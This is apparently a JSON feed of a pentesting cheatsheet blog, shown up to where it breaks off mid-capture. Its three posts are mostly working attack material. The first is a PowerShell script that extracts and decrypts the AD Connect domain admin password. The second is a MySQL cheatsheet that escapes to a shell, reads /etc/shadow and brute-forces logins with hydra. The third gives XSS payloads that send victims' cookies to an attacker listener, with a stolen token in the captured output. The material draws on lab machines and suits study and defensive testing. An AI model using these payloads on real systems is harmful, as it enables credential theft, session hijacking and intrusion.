{
    "version": "https://jsonfeed.org/version/1",
    "title": "Spindel",
    "home_page_url": "https://mvineza.github.io/spindel/",
    "feed_url": "https://mvineza.github.io/spindel/feed.json",
    "description": "A minimalist, quick search cybersecurity blog and cheatsheets",
    "icon": "https://mvineza.github.io/spindel/apple-touch-icon.png",
    "favicon": "https://mvineza.github.io/spindel/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "spindel",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/18/extracting-creds-from-ad-connect",
            "title": "Extracting creds from AD Connect",
            "summary": "Extracting creds from AD Connect",
            "content_text": "OverviewAttacker can extract admin credentials from ADSync databases that is used for syncing credential hashes from onpremis AD to Azure AD.Enviroment Setup and Requirements  AD sync must be running on victim machine using “Password Hash Synchronisation (PHS)”  Low privileged user must have permission on ADSync DB  Attacker must have gained access to that low privileged account via winrmSteps  Login to victim via winrm  Check if AD Sync is runningGet-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync  Verify access to ADSync DB*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; sqlcmd /S localhost /d ADSync /q \"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\"keyset_id   instance_id                          entropy----------- ------------------------------------ ------------------------------------          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD(1 rows affected)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt;   Run this powershell script. This will get the encrypted string from mms_management_agent table and decrypt it using mcrypt.dll.Write-Host \"AD Connect Sync Credential Extract POC (@_xpn_)`n\"$sqlserver = \"localhost\"$dbname = \"ADSync\"$client = New-Object System.Data.SqlClient.SqlConnection$client.ConnectionString = \"Server = $sqlserver; Database = $dbname; Integrated Security = True\"$client.Open()$cmd = $client.CreateCommand()$cmd.CommandText = \"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\"$reader = $cmd.ExecuteReader()$reader.Read() | Out-Null$key_id = $reader.GetInt32(0)$instance_id = $reader.GetGuid(1)$entropy = $reader.GetGuid(2)$reader.Close()$cmd = $client.CreateCommand()$cmd.CommandText = \"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'\"$reader = $cmd.ExecuteReader()$reader.Read() | Out-Null$config = $reader.GetString(0)$crypted = $reader.GetString(1)$reader.Close()add-type -path 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager$km.LoadKeySet($entropy, $instance_id, $key_id)$key = $null$km.GetActiveCredentialKey([ref]$key)$key2 = $null$km.GetKey(1, [ref]$key2)$decrypted = $null$key2.DecryptBase64ToString($crypted, [ref]$decrypted)$domain = select-xml -Content $config -XPath \"//parameter[@name='forest-login-domain']\" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}$username = select-xml -Content $config -XPath \"//parameter[@name='forest-login-user']\" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}$password = select-xml -Content $decrypted -XPath \"//attribute\" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}Write-Host (\"Domain: \" + $domain.Domain)Write-Host (\"Username: \" + $username.Username)Write-Host (\"Password: \" + $password.Password)  Run the script*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; .\\decrypt.ps1AD Connect Sync Credential Extract POC (@_xpn_)Domain: MEGABANK.LOCALUsername: administratorPassword: d0m@in4dminyeah!*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt;GotchasOlder versions of AD Connect uses registry but newer ones uses DPAPI. Take this into consideration when using tools to extract the credentials.To see the version, use this command.Get-ItemProperty -Path \"C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\miiserver.exe\" | Format-list -Property * -ForceReferences  HTB Monteverde  Azure AD Connect for Red Teamers - XPN InfoSec Blog",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can extract admin credentials from ADSync databases that is used for syncing credential hashes from onpremis AD to Azure AD.</p><h2 id=\"enviroment-setup-and-requirements\">Enviroment Setup and Requirements</h2><ul>  <li>AD sync must be running on victim machine using “Password Hash Synchronisation (PHS)”</li>  <li>Low privileged user must have permission on <code class=\"language-plaintext highlighter-rouge\">ADSync</code> DB</li>  <li>Attacker must have gained access to that low privileged account via winrm</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Login to victim via winrm</li>  <li>Check if AD Sync is running</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Get-Item</span><span class=\"w\"> </span><span class=\"nt\">-Path</span><span class=\"w\"> </span><span class=\"nx\">HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Verify access to ADSync DB</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\Users\\mhope\\Documents</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"nx\">sqlcmd</span><span class=\"w\"> </span><span class=\"nx\">/S</span><span class=\"w\"> </span><span class=\"nx\">localhost</span><span class=\"w\"> </span><span class=\"nx\">/d</span><span class=\"w\"> </span><span class=\"nx\">ADSync</span><span class=\"w\"> </span><span class=\"nx\">/q</span><span class=\"w\"> </span><span class=\"s2\">\"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\"</span><span class=\"w\"></span><span class=\"n\">keyset_id</span><span class=\"w\">   </span><span class=\"nx\">instance_id</span><span class=\"w\">                          </span><span class=\"nx\">entropy</span><span class=\"w\"></span><span class=\"o\">-----------</span><span class=\"w\"> </span><span class=\"o\">------------------------------------</span><span class=\"w\"> </span><span class=\"o\">------------------------------------</span><span class=\"w\">          </span><span class=\"mi\">1</span><span class=\"w\"> </span><span class=\"mi\">1852</span><span class=\"n\">B527-DD4F-4ECF-B541-EFCCBFF29E31</span><span class=\"w\"> </span><span class=\"nx\">194EC2FC-F186-46CF-B44D-071EB61F49CD</span><span class=\"w\"></span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"w\"> </span><span class=\"n\">rows</span><span class=\"w\"> </span><span class=\"nx\">affected</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\Users\\mhope\\Documents</span><span class=\"err\">&gt;</span><span class=\"w\"> </span></code></pre></div></div><ul>  <li>Run this powershell script. This will get the encrypted string from <code class=\"language-plaintext highlighter-rouge\">mms_management_agent</code> table and decrypt it using <code class=\"language-plaintext highlighter-rouge\">mcrypt.dll</code>.</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Write-Host</span><span class=\"w\"> </span><span class=\"s2\">\"AD Connect Sync Credential Extract POC (@_xpn_)</span><span class=\"se\">`n</span><span class=\"s2\">\"</span><span class=\"w\"></span><span class=\"nv\">$sqlserver</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s2\">\"localhost\"</span><span class=\"w\"></span><span class=\"nv\">$dbname</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s2\">\"ADSync\"</span><span class=\"w\"></span><span class=\"nv\">$client</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">New-Object</span><span class=\"w\"> </span><span class=\"nx\">System.Data.SqlClient.SqlConnection</span><span class=\"w\"></span><span class=\"nv\">$client</span><span class=\"o\">.</span><span class=\"nf\">ConnectionString</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s2\">\"Server = </span><span class=\"nv\">$sqlserver</span><span class=\"s2\">; Database = </span><span class=\"nv\">$dbname</span><span class=\"s2\">; Integrated Security = True\"</span><span class=\"w\"></span><span class=\"nv\">$client</span><span class=\"o\">.</span><span class=\"nf\">Open</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$cmd</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$client</span><span class=\"o\">.</span><span class=\"nf\">CreateCommand</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$cmd</span><span class=\"o\">.</span><span class=\"nf\">CommandText</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s2\">\"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\"</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$cmd</span><span class=\"o\">.</span><span class=\"nf\">ExecuteReader</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">Read</span><span class=\"p\">()</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">Out-Null</span><span class=\"w\"></span><span class=\"nv\">$key_id</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">GetInt32</span><span class=\"p\">(</span><span class=\"nx\">0</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$instance_id</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">GetGuid</span><span class=\"p\">(</span><span class=\"nx\">1</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$entropy</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">GetGuid</span><span class=\"p\">(</span><span class=\"nx\">2</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">Close</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$cmd</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$client</span><span class=\"o\">.</span><span class=\"nf\">CreateCommand</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$cmd</span><span class=\"o\">.</span><span class=\"nf\">CommandText</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s2\">\"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'\"</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$cmd</span><span class=\"o\">.</span><span class=\"nf\">ExecuteReader</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">Read</span><span class=\"p\">()</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">Out-Null</span><span class=\"w\"></span><span class=\"nv\">$config</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">GetString</span><span class=\"p\">(</span><span class=\"nx\">0</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$crypted</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">GetString</span><span class=\"p\">(</span><span class=\"nx\">1</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">Close</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"n\">add-type</span><span class=\"w\"> </span><span class=\"nt\">-path</span><span class=\"w\"> </span><span class=\"s1\">'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'</span><span class=\"w\"></span><span class=\"nv\">$km</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">New-Object</span><span class=\"w\"> </span><span class=\"nt\">-TypeName</span><span class=\"w\"> </span><span class=\"nx\">Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</span><span class=\"w\"></span><span class=\"nv\">$km</span><span class=\"o\">.</span><span class=\"nf\">LoadKeySet</span><span class=\"p\">(</span><span class=\"nv\">$entropy</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nv\">$instance_id</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nv\">$key_id</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$key</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"bp\">$null</span><span class=\"w\"></span><span class=\"nv\">$km</span><span class=\"o\">.</span><span class=\"nf\">GetActiveCredentialKey</span><span class=\"p\">([</span><span class=\"n\">ref</span><span class=\"p\">]</span><span class=\"nv\">$key</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$key2</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"bp\">$null</span><span class=\"w\"></span><span class=\"nv\">$km</span><span class=\"o\">.</span><span class=\"nf\">GetKey</span><span class=\"p\">(</span><span class=\"nx\">1</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"n\">ref</span><span class=\"p\">]</span><span class=\"nv\">$key2</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$decrypted</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"bp\">$null</span><span class=\"w\"></span><span class=\"nv\">$key2</span><span class=\"o\">.</span><span class=\"nf\">DecryptBase64ToString</span><span class=\"p\">(</span><span class=\"nv\">$crypted</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"n\">ref</span><span class=\"p\">]</span><span class=\"nv\">$decrypted</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$domain</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">select-xml</span><span class=\"w\"> </span><span class=\"nt\">-Content</span><span class=\"w\"> </span><span class=\"nv\">$config</span><span class=\"w\"> </span><span class=\"nt\">-XPath</span><span class=\"w\"> </span><span class=\"s2\">\"//parameter[@name='forest-login-domain']\"</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">select</span><span class=\"w\"> </span><span class=\"p\">@{</span><span class=\"nx\">Name</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s1\">'Domain'</span><span class=\"p\">;</span><span class=\"w\"> </span><span class=\"nx\">Expression</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"bp\">$_</span><span class=\"o\">.</span><span class=\"nf\">node</span><span class=\"o\">.</span><span class=\"nf\">InnerXML</span><span class=\"p\">}}</span><span class=\"w\"></span><span class=\"nv\">$username</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">select-xml</span><span class=\"w\"> </span><span class=\"nt\">-Content</span><span class=\"w\"> </span><span class=\"nv\">$config</span><span class=\"w\"> </span><span class=\"nt\">-XPath</span><span class=\"w\"> </span><span class=\"s2\">\"//parameter[@name='forest-login-user']\"</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">select</span><span class=\"w\"> </span><span class=\"p\">@{</span><span class=\"nx\">Name</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s1\">'Username'</span><span class=\"p\">;</span><span class=\"w\"> </span><span class=\"nx\">Expression</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"bp\">$_</span><span class=\"o\">.</span><span class=\"nf\">node</span><span class=\"o\">.</span><span class=\"nf\">InnerXML</span><span class=\"p\">}}</span><span class=\"w\"></span><span class=\"nv\">$password</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">select-xml</span><span class=\"w\"> </span><span class=\"nt\">-Content</span><span class=\"w\"> </span><span class=\"nv\">$decrypted</span><span class=\"w\"> </span><span class=\"nt\">-XPath</span><span class=\"w\"> </span><span class=\"s2\">\"//attribute\"</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">select</span><span class=\"w\"> </span><span class=\"p\">@{</span><span class=\"nx\">Name</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s1\">'Password'</span><span class=\"p\">;</span><span class=\"w\"> </span><span class=\"nx\">Expression</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"bp\">$_</span><span class=\"o\">.</span><span class=\"nf\">node</span><span class=\"o\">.</span><span class=\"nf\">InnerText</span><span class=\"p\">}}</span><span class=\"w\"></span><span class=\"n\">Write-Host</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"s2\">\"Domain: \"</span><span class=\"w\"> </span><span class=\"o\">+</span><span class=\"w\"> </span><span class=\"nv\">$domain</span><span class=\"o\">.</span><span class=\"nf\">Domain</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"n\">Write-Host</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"s2\">\"Username: \"</span><span class=\"w\"> </span><span class=\"o\">+</span><span class=\"w\"> </span><span class=\"nv\">$username</span><span class=\"o\">.</span><span class=\"nf\">Username</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"n\">Write-Host</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"s2\">\"Password: \"</span><span class=\"w\"> </span><span class=\"o\">+</span><span class=\"w\"> </span><span class=\"nv\">$password</span><span class=\"o\">.</span><span class=\"nf\">Password</span><span class=\"p\">)</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Run the script</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\Users\\mhope\\Documents</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"o\">.</span><span class=\"nx\">\\decrypt.ps1</span><span class=\"w\"></span><span class=\"n\">AD</span><span class=\"w\"> </span><span class=\"nx\">Connect</span><span class=\"w\"> </span><span class=\"nx\">Sync</span><span class=\"w\"> </span><span class=\"nx\">Credential</span><span class=\"w\"> </span><span class=\"nx\">Extract</span><span class=\"w\"> </span><span class=\"nx\">POC</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"err\">@_</span><span class=\"n\">xpn_</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"n\">Domain:</span><span class=\"w\"> </span><span class=\"nx\">MEGABANK.LOCAL</span><span class=\"w\"></span><span class=\"n\">Username:</span><span class=\"w\"> </span><span class=\"nx\">administrator</span><span class=\"w\"></span><span class=\"n\">Password:</span><span class=\"w\"> </span><span class=\"nx\">d0m</span><span class=\"err\">@</span><span class=\"nx\">in4dminyeah</span><span class=\"o\">!</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\Users\\mhope\\Documents</span><span class=\"err\">&gt;</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"gotchas\">Gotchas</h2><p>Older versions of AD Connect uses registry but newer ones uses DPAPI. Take this into consideration when using tools to extract the credentials.</p><p>To see the version, use this command.</p><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Get-ItemProperty</span><span class=\"w\"> </span><span class=\"nt\">-Path</span><span class=\"w\"> </span><span class=\"s2\">\"C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\miiserver.exe\"</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">Format-list</span><span class=\"w\"> </span><span class=\"nt\">-Property</span><span class=\"w\"> </span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nt\">-Force</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Monteverde</li>  <li><a href=\"https://blog.xpnsec.com/azuread-connect-for-redteam/\">Azure AD Connect for Red Teamers - XPN InfoSec Blog</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/18/extracting-creds-from-ad-connect",
            
            
            
            "tags": ["privesc","windows","azure"],
            
            "date_published": "2022-02-18T00:00:00+08:00",
            "date_modified": "2022-02-18T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/16/mysql",
            "title": "MySQL",
            "summary": "MySQL",
            "content_text": "Ports  3306/tcpGathering Information from outside# nmapnmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.166.72Authentication# extracting creds from filescat /etc/mysql/debian.cnfgrep -oaE \"[-_\\.\\*a-Z0-9]{3,}\" | grep -v \"mysql_native_password\"Gathering infor inside SQL shell; Checks versionselect @@version;; Checks userselect user();; checks permissions and privilegesshow grants for 'root'@'localhost';\tPrivesc; Breaks out from shell\\! cat /etc/passwd\\! cat /etc/shadow\\! bashFiles and directories# settingscat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | grep \"user\"Brute Force# mysql over ssh tunnelhydra -V -L users.txt -P passwords.txt 127.0.0.1 -s 9000 mysqlExploits  UDF - used in vulnhub lord of the rootOther resources  3306 - Pentesting Mysql - HackTricks",
            "content_html": "<h2 id=\"ports\">Ports</h2><ul>  <li>3306/tcp</li></ul><h2 id=\"gathering-information-from-outside\">Gathering Information from outside</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># nmap</span>nmap <span class=\"nt\">-sV</span> <span class=\"nt\">-p</span> 3306 <span class=\"nt\">--script</span> mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.166.72</code></pre></div></div><h2 id=\"authentication\">Authentication</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># extracting creds from files</span><span class=\"nb\">cat</span> /etc/mysql/debian.cnf<span class=\"nb\">grep</span> <span class=\"nt\">-oaE</span> <span class=\"s2\">\"[-_</span><span class=\"se\">\\.\\*</span><span class=\"s2\">a-Z0-9]{3,}\"</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> <span class=\"s2\">\"mysql_native_password\"</span></code></pre></div></div><h2 id=\"gathering-infor-inside-sql-shell\">Gathering infor inside SQL shell</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">;</span> <span class=\"n\">Checks</span> <span class=\"k\">version</span><span class=\"k\">select</span> <span class=\"o\">@@</span><span class=\"k\">version</span><span class=\"p\">;</span><span class=\"p\">;</span> <span class=\"n\">Checks</span> <span class=\"k\">user</span><span class=\"k\">select</span> <span class=\"k\">user</span><span class=\"p\">();</span><span class=\"p\">;</span> <span class=\"n\">checks</span> <span class=\"n\">permissions</span> <span class=\"k\">and</span> <span class=\"k\">privileges</span><span class=\"k\">show</span> <span class=\"n\">grants</span> <span class=\"k\">for</span> <span class=\"s1\">'root'</span><span class=\"o\">@</span><span class=\"s1\">'localhost'</span><span class=\"p\">;</span>\t</code></pre></div></div><h2 id=\"privesc\">Privesc</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">;</span> <span class=\"n\">Breaks</span> <span class=\"k\">out</span> <span class=\"k\">from</span> <span class=\"n\">shell</span><span class=\"err\">\\</span><span class=\"o\">!</span> <span class=\"n\">cat</span> <span class=\"o\">/</span><span class=\"n\">etc</span><span class=\"o\">/</span><span class=\"n\">passwd</span><span class=\"err\">\\</span><span class=\"o\">!</span> <span class=\"n\">cat</span> <span class=\"o\">/</span><span class=\"n\">etc</span><span class=\"o\">/</span><span class=\"n\">shadow</span><span class=\"err\">\\</span><span class=\"o\">!</span> <span class=\"n\">bash</span></code></pre></div></div><h2 id=\"files-and-directories\">Files and directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># settings</span><span class=\"nb\">cat</span> /etc/mysql/mysql.conf.d/mysqld.cnf | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> <span class=\"s2\">\"#\"</span> | <span class=\"nb\">grep</span> <span class=\"s2\">\"user\"</span></code></pre></div></div><h2 id=\"brute-force\">Brute Force</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># mysql over ssh tunnel</span>hydra <span class=\"nt\">-V</span> <span class=\"nt\">-L</span> users.txt <span class=\"nt\">-P</span> passwords.txt 127.0.0.1 <span class=\"nt\">-s</span> 9000 mysql</code></pre></div></div><h2 id=\"exploits\">Exploits</h2><ul>  <li><a href=\"https://www.exploit-db.com/exploits/1518\">UDF</a> - used in vulnhub lord of the root</li></ul><h2 id=\"other-resources\">Other resources</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-mysql\">3306 - Pentesting Mysql - HackTricks</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/16/mysql",
            
            
            
            "tags": ["db","enum"],
            
            "date_published": "2022-02-16T00:00:00+08:00",
            "date_modified": "2022-02-16T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/12/cookie-session-hijacking",
            "title": "Cookie/Session Hijacking",
            "summary": "Cookie/Session Hijacking",
            "content_text": "Intercepting via netcat  Open netcat listener on attacker machinenc -nlvp 4444  Submit this XSS script on the form&lt;script&gt;new Image().src=\"http://10.11.40.33:4444/bogus.php?output=\"+document.cookie;&lt;/script&gt;  You will be able to intercept the cookie➜  marketplace nc -nlvp 4444        listening on [any] 4444 ...connect to [10.11.40.33] from (UNKNOWN) [10.11.40.33] 57706GET /bogus.php?output=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiZGVtbyIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjI4MTU5MzYzfQ.Nka6_SPBNEE1B3PmDWg4p7c3cG3BF4zqhTMCgGa6bJM HTTP/1.1Host: 10.11.40.33:4444Connection: keep-aliveUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8Referer: http://10.10.177.20/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9  You can use this method to grab an admin cookie  An alternative is using fetch and redirecting it to your HTTP listener# using fetch&lt;script&gt;fetch(\"http://10.11.40.33:4444/\"+document.cookie)&lt;/script&gt;  NOTE: There mght be delay in seeing the output so you might want to be patientRedirect to another page  Insert this payload to comment section# 10.10.39.208 - victim ip&lt;script&gt;document.location='http://10.10.39.208/log/'+document.cookie&lt;/script&gt;  Refresh the page  Go to /logsOther payloads# sent by server -&gt; cookie: deniedcookie: grantedReferences  HTB RedCross  Cookies Hacking - HackTricks",
            "content_html": "<h2 id=\"intercepting-via-netcat\">Intercepting via netcat</h2><ul>  <li>Open netcat listener on attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>nc <span class=\"nt\">-nlvp</span> 4444</code></pre></div></div><ul>  <li>Submit this XSS script on the form</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>&lt;script&gt;new Image().src=\"http://10.11.40.33:4444/bogus.php?output=\"+document.cookie;&lt;/script&gt;</code></pre></div></div><p><img src=\"/spindel/assets/Cookie%20(Session)%20Hijacking/BC7E0478-D577-462B-BCF7-A9A0D0590D87.png\" alt=\"\" /></p><ul>  <li>You will be able to intercept the cookie</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  marketplace nc <span class=\"nt\">-nlvp</span> 4444        listening on <span class=\"o\">[</span>any] 4444 ...connect to <span class=\"o\">[</span>10.11.40.33] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>10.11.40.33] 57706GET /bogus.php?output<span class=\"o\">=</span><span class=\"nv\">token</span><span class=\"o\">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiZGVtbyIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjI4MTU5MzYzfQ.Nka6_SPBNEE1B3PmDWg4p7c3cG3BF4zqhTMCgGa6bJM HTTP/1.1Host: 10.11.40.33:4444Connection: keep-aliveUser-Agent: Mozilla/5.0 